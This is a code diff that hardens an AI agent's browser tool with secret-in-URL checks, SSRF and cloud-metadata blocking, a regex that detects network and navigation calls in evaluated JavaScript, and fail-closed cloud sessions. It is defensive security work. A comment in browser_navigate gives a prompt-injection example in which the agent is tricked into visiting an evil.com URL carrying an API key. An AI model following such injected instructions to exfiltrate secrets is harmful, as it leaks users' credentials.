@@ -99,16 +99,129 @@ except ImportError:
 
 logger = logging.getLogger(__name__)
 
+_BROWSER_EVAL_URL_RE = re.compile(r"https?://[^\s\'\"<>`)]+", re.IGNORECASE)
+_BROWSER_EVAL_NAV_OR_NETWORK_RE = re.compile(
+    r"\b(?:fetch|XMLHttpRequest|WebSocket|EventSource|Worker|SharedWorker|importScripts)\b"
+    r"|\bsendBeacon\b"
+    r"|\bwindow\s*\.\s*open\b"
+    r"|\blocation\s*="
+    r"|\blocation\s*\.\s*(?:assign|replace|reload)\s*\("
+    r"|\b(?:href|src|action)\s*="
+    r"|\.\s*submit\s*\("
+    r"|\.\s*setAttribute\s*\(\s*['\"](?:href|src|action)['\"]",
+    re.IGNORECASE,
+)
+
+
+def _browser_url_security_block(url: str, *, auto_local_this_nav: bool = False) -> Optional[Dict[str, Any]]:
+    """Return a browser policy block response for a URL, or None when allowed."""
+    from agent.redact import url_contains_secret
+
+    if url_contains_secret(url):
+        return {
+            "success": False,
+            "error": (
+                "Blocked: URL contains what appears to be an API key or token. "
+                "Secrets must not be sent in URLs."
+            ),
+        }
+
+    if not _is_local_backend() and _is_always_blocked_url(url):
+        return {"success": False, "error": "Blocked: URL targets a cloud metadata endpoint"}
+
+    if _is_camofox_mode():
+        if _is_always_blocked_url(url):
+            return {"success": False, "error": "Blocked: URL targets a cloud metadata endpoint"}
+        if not _is_safe_url(url):
+            return {"success": False, "error": "Blocked: URL targets a private or internal address"}
+
+    if (
+        not auto_local_this_nav
+        and not _allow_private_urls()
+        and not _is_safe_url(url)
+    ):
+        return {"success": False, "error": "Blocked: URL targets a private or internal address"}
+
+    blocked = check_website_access(url)
+    if blocked:
+        return {
+            "success": False,
+            "error": blocked["message"],
+            "blocked_by_policy": {
+                "host": blocked["host"],
+                "rule": blocked["rule"],
+                "source": blocked["source"],
+            },
+        }
+
+    return None
+
+
+def _browser_url_security_error(url: str, *, auto_local_this_nav: bool = False) -> Optional[str]:
+    """Return a browser policy error for a URL, or None when it is allowed."""
+    block = _browser_url_security_block(url, auto_local_this_nav=auto_local_this_nav)
+    return str(block["error"]) if block else None
+
+
+def _browser_eval_security_error(expression: str) -> Optional[str]:
+    """Return a policy error when a browser eval expression is unsafe."""
+    import urllib.parse
+    from agent.redact import _PREFIX_RE
+
+    expression_decoded = urllib.parse.unquote(expression)
+    if _PREFIX_RE.search(expression) or _PREFIX_RE.search(expression_decoded):
+        return (
+            "Blocked: URL contains what appears to be an API key or token. "
+            "Secrets must not be sent in URLs."
+        )
+
+    for url in _BROWSER_EVAL_URL_RE.findall(expression):
+        error = _browser_url_security_error(url.rstrip(".,;"))
+        if error:
+            return error
+
+    if not _is_local_backend() and _BROWSER_EVAL_NAV_OR_NETWORK_RE.search(expression):
+        return (
+            "Blocked: browser JavaScript evaluation cannot perform navigation "
+            "or network requests in cloud browser sessions. Use browser_navigate "
+            "for navigation so URL safety checks are enforced."
+        )
+
+    return None
+
+
+def _browser_eval_final_url_error(effective_task_id: str) -> Optional[str]:
+    """Validate the browser's current URL after eval-triggered side effects."""
+    if _is_local_backend():
+        return None
+
+    result = _run_browser_command(effective_task_id, "eval", ["location.href"], timeout=10)
+    if not result.get("success"):
+        return None
+
+    current_url = str(result.get("data", {}).get("result") or "").strip()
+    if not current_url.lower().startswith(("http://", "https://")):
+        return None
+
+    return _browser_url_security_error(current_url)
+
+
+def _blank_browser_after_block(effective_task_id: str) -> None:
+    """Best-effort blanking after an unsafe eval side effect is detected."""
+    try:
+        _run_browser_command(effective_task_id, "open", ["about:blank"], timeout=10)
+    except Exception:
+        logger.debug("Failed to blank browser after unsafe eval side effect", exc_info=True)
 # Standard PATH entries for environments with minimal PATH (e.g. systemd services).
-# Includes Android/Termux and macOS Homebrew locations needed for agent-browser,
-# npx, node, and Android's glibc runner (grun).
+# Includes Android/Termux locations needed for agent-browser and Android's
+# glibc runner (grun), plus system directories. User-writable package-manager
+# prefixes such as Homebrew (``/opt/homebrew/{bin,sbin}``,
+# ``/usr/local/{bin,sbin}``) are intentionally not injected when absent from
+# the operator-provided PATH — those are trust roots an operator may have
+# deliberately removed (restricted-PATH launches).
 _SANE_PATH_DIRS = (
     "/data/data/com.termux/files/usr/bin",
     "/data/data/com.termux/files/usr/sbin",
-    "/opt/homebrew/bin",
-    "/opt/homebrew/sbin",
-    "/usr/local/sbin",
-    "/usr/local/bin",
     "/usr/sbin",
     "/usr/bin",
     "/sbin",
@@ -140,20 +253,38 @@ def _discover_homebrew_node_dirs() -> tuple[str, ...]:
     return tuple(dirs)
 
 
-def _browser_candidate_path_dirs() -> list[str]:
-    """Return ordered browser CLI PATH candidates shared by discovery and execution."""
+def _browser_candidate_path_dirs(existing_path: str = "") -> list[str]:
+    """Return safe browser CLI PATH candidates shared by discovery and execution.
+
+    User-writable trust roots (Homebrew prefix, Hermes-managed Node bin) are
+    only added when ``existing_path`` already lists that root. This preserves
+    restricted-PATH launches (cron, systemd, locked-down operator configs)
+    while still letting normal interactive installs find their toolchains.
+    """
+    path_parts = [p for p in (existing_path or "").split(os.pathsep) if p]
+    candidates = list(_SANE_PATH_DIRS)
+
+    if any(p.startswith("/opt/homebrew/") or p == "/opt/homebrew" for p in path_parts):
+        candidates.extend(_discover_homebrew_node_dirs())
+
+    if any(p.startswith("/usr/local/") or p == "/usr/local" for p in path_parts):
+        candidates.extend(("/usr/local/bin", "/usr/local/sbin"))
+
     hermes_home = get_hermes_home()
     hermes_node_bin = str(hermes_home / "node" / "bin")
-    return [hermes_node_bin, *list(_discover_homebrew_node_dirs()), *_SANE_PATH_DIRS]
+    if hermes_node_bin in path_parts:
+        candidates.append(hermes_node_bin)
+
+    return candidates
 
 
 def _merge_browser_path(existing_path: str = "") -> str:
-    """Prepend browser-specific PATH fallbacks without reordering existing entries."""
+    """Prepend safe browser PATH fallbacks without reordering existing entries."""
     path_parts = [p for p in (existing_path or "").split(os.pathsep) if p]
     existing_parts = set(path_parts)
     prefix_parts: list[str] = []
 
-    for part in _browser_candidate_path_dirs():
+    for part in _browser_candidate_path_dirs(existing_path):
         if not part or part in existing_parts or part in prefix_parts:
             continue
         if os.path.isdir(part):
@@ -1580,37 +1711,42 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
         if provider is None:
             session_info = _create_local_session(task_id)
         else:
+            provider_name = type(provider).__name__
             try:
                 session_info = provider.create_session(task_id)
-                # Validate cloud provider returned a usable session
-                if not session_info or not isinstance(session_info, dict):
-                    raise ValueError(f"Cloud provider returned invalid session: {session_info!r}")
-                if session_info.get("cdp_url"):
-                    # Some cloud providers (including Browser-Use v3) return an HTTP
-                    # CDP discovery URL instead of a raw websocket endpoint.
-                    session_info = dict(session_info)
-                    session_info["cdp_url"] = _resolve_cdp_override(str(session_info["cdp_url"]))
             except Exception as e:
-                provider_name = type(provider).__name__
-                logger.warning(
-                    "Cloud provider %s failed (%s); attempting fallback to local "
-                    "Chromium for task %s",
-                    provider_name, e, task_id,
-                    exc_info=True,
+                raise RuntimeError(
+                    f"Cloud browser provider {provider_name} failed to create a "
+                    "session; refusing to fall back to local Chromium because that "
+                    "would move browser execution onto the Hermes host"
+                ) from e
+
+            # Validate cloud provider returned a usable remote session. A cloud
+            # configuration is an isolation boundary: missing CDP metadata must
+            # fail closed rather than implicitly selecting local --session mode.
+            if not session_info or not isinstance(session_info, dict):
+                raise RuntimeError(
+                    f"Cloud browser provider {provider_name} returned invalid "
+                    f"session metadata: {session_info!r}"
                 )
-                try:
-                    session_info = _create_local_session(task_id)
-                except Exception as local_error:
-                    raise RuntimeError(
-                        f"Cloud provider {provider_name} failed ({e}) and local "
-                        f"fallback also failed ({local_error})"
-                    ) from e
-                # Mark session as degraded for observability
-                if isinstance(session_info, dict):
-                    session_info = dict(session_info)
-                    session_info["fallback_from_cloud"] = True
-                    session_info["fallback_reason"] = str(e)
-                    session_info["fallback_provider"] = provider_name
+            raw_cdp_url = str(session_info.get("cdp_url") or "").strip()
+            if not raw_cdp_url:
+                raise RuntimeError(
+                    f"Cloud browser provider {provider_name} returned session "
+                    "metadata without a CDP URL; refusing to fall back to local "
+                    "Chromium"
+                )
+
+            # Some cloud providers (including Browser-Use v3) return an HTTP
+            # CDP discovery URL instead of a raw websocket endpoint.
+            session_info = dict(session_info)
+            session_info["cdp_url"] = _resolve_cdp_override(raw_cdp_url)
+            if not session_info["cdp_url"]:
+                raise RuntimeError(
+                    f"Cloud browser provider {provider_name} returned session "
+                    "metadata without a CDP URL; refusing to fall back to local "
+                    "Chromium"
+                )
 
     with _cleanup_lock:
         # Double-check: another thread may have created a session while we
@@ -1666,9 +1802,11 @@ def _find_agent_browser() -> str:
         _agent_browser_resolved = True
         return which_result
 
-    # Build an extended search PATH including Hermes-managed Node, macOS
-    # versioned Homebrew installs, and fallback system dirs like Termux.
-    extended_path = _merge_browser_path("")
+    # Build an extended search PATH from safe fallback dirs plus any toolchain
+    # prefixes the operator already opted into via the process PATH (Homebrew,
+    # Hermes-managed Node, /usr/local). Restricted-PATH launches stay
+    # restricted; normal interactive installs still discover their toolchains.
+    extended_path = _merge_browser_path(os.environ.get("PATH", ""))
     if extended_path:
         which_result = shutil.which("agent-browser", path=extended_path)
         if which_result:
@@ -1868,34 +2006,6 @@ def _run_browser_command(
             idle_ms = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)
             browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = idle_ms
 
-        # Inject --no-sandbox when needed (issue #15765):
-        # - Running as root: Chromium always refuses to start without it
-        # - Ubuntu 23.10+ / AppArmor systems: unprivileged user namespaces
-        #   are restricted, causing Chromium to exit with "No usable sandbox"
-        #   even for non-root users running under systemd or containers.
-        if "AGENT_BROWSER_CHROME_FLAGS" not in browser_env:
-            _needs_sandbox_bypass = False
-            if hasattr(os, "geteuid") and os.geteuid() == 0:
-                _needs_sandbox_bypass = True
-                logger.debug("browser: running as root — injecting --no-sandbox")
-            else:
-                # Detect AppArmor user namespace restrictions (Ubuntu 23.10+)
-                _userns_restrict = "/proc/sys/kernel/apparmor_restrict_unprivileged_userns"
-                try:
-                    with open(_userns_restrict, encoding="utf-8") as _f:
-                        if _f.read().strip() == "1":
-                            _needs_sandbox_bypass = True
-                            logger.debug(
-                                "browser: AppArmor userns restrictions detected — "
-                                "injecting --no-sandbox"
-                            )
-                except OSError:
-                    pass
-            if _needs_sandbox_bypass:
-                browser_env["AGENT_BROWSER_CHROME_FLAGS"] = (
-                    "--no-sandbox --disable-dev-shm-usage"
-                )
-
         # Use temp files for stdout/stderr instead of pipes.
         # agent-browser starts a background daemon that inherits file
         # descriptors.  With capture_output=True (pipes), the daemon keeps
@@ -2029,9 +2139,13 @@ def _run_browser_command(
         result = {"success": False, "error": str(e)}
 
     # --- Lightpanda automatic Chrome fallback ---
-    # If engine is lightpanda and the result looks broken, retry with Chrome.
-    # This runs for ALL exit paths (timeout, empty, non-JSON, nonzero rc, parsed).
-    fallback_reason = _lightpanda_fallback_reason(engine, command, result)
+    # If the active session is a local Lightpanda daemon and the result looks
+    # broken, retry with Chrome. Cloud CDP sessions intentionally omit
+    # ``--engine`` above, so a configured Lightpanda engine does not prove the
+    # active backend is Lightpanda; falling back locally would bypass the cloud
+    # browser network boundary.
+    fallback_engine = engine if not session_info.get("cdp_url") else "auto"
+    fallback_reason = _lightpanda_fallback_reason(fallback_engine, command, result)
     if fallback_reason:
         logger.info(
             "Lightpanda fallback: retrying '%s' with Chrome (task=%s): %s",
@@ -2155,11 +2269,10 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # Secret exfiltration protection — block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
-    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
-    import urllib.parse
-    from agent.redact import _PREFIX_RE
-    url_decoded = urllib.parse.unquote(url)
-    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
+    # url_contains_secret applies repeated percent-decoding so double-encoded
+    # tricks (sk%252Dant%252D... → sk-ant-...) are still caught.
+    from agent.redact import url_contains_secret
+    if url_contains_secret(url):
         return json.dumps({
             "success": False,
             "error": "Blocked: URL contains what appears to be an API key or token. "
@@ -2167,13 +2280,14 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         })
 
     # SSRF protection — block private/internal addresses before navigating.
-    # Skipped for local backends (Camofox, headless Chromium without a cloud
-    # provider) because the agent already has full local network access via
-    # the terminal tool.  Also skipped when hybrid routing will auto-spawn a
-    # local Chromium sidecar for this URL (cloud provider configured +
-    # private URL + ``browser.auto_local_for_private_urls`` enabled) — the
-    # cloud provider never sees the URL in that case.  Can also be opted
-    # out globally via ``browser.allow_private_urls`` in config.
+    # Local browser backends still enforce this guard by default because
+    # browser_snapshot can return local files and internal service responses
+    # in browser-only or reduced-tool configurations.  Hybrid routing may
+    # still auto-spawn a local Chromium sidecar for ordinary private URLs
+    # (cloud provider configured + private URL + ``browser.auto_local_for_private_urls``
+    # enabled) so the cloud provider
+    # never sees the URL.  Users can opt out globally via
+    # ``browser.allow_private_urls`` in config.
     effective_task_id = task_id or "default"
     nav_session_key = _navigation_session_key(effective_task_id, url)
     auto_local_this_nav = _is_local_sidecar_key(nav_session_key)
@@ -2190,9 +2304,20 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
             "error": "Blocked: URL targets a cloud metadata endpoint",
         })
 
+    if _is_camofox_mode():
+        if _is_always_blocked_url(url):
+            return json.dumps({
+                "success": False,
+                "error": "Blocked: URL targets a cloud metadata endpoint",
+            })
+        if not _is_safe_url(url):
+            return json.dumps({
+                "success": False,
+                "error": "Blocked: URL targets a private or internal address",
+            })
+
     if (
-        not _is_local_backend()
-        and not auto_local_this_nav
+        not auto_local_this_nav
         and not _allow_private_urls()
         and not _is_safe_url(url)
     ):
@@ -2268,8 +2393,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
             })
 
         if (
-            not _is_local_backend()
-            and not auto_local_this_nav
+            not auto_local_this_nav
             and not _allow_private_urls()
             and final_url and final_url != url and not _is_safe_url(final_url)
         ):
